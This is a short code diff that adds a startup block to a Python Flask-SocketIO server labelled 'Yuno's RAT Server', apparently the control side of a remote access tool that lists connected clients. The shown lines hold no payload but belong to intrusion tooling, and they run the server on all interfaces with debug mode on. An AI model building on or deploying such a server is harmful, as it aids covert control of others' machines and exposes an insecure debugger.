@@ -227,3 +227,8 @@ def handle_request_client_info():
         for cid, info in client_info.items()
     ]
     emit('client_info', client_info_list)
+
+if __name__ == "__main__":
+    print("=== Yuno's RAT Server ===")
+    print("A remote access server by Yuno\n")
+    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
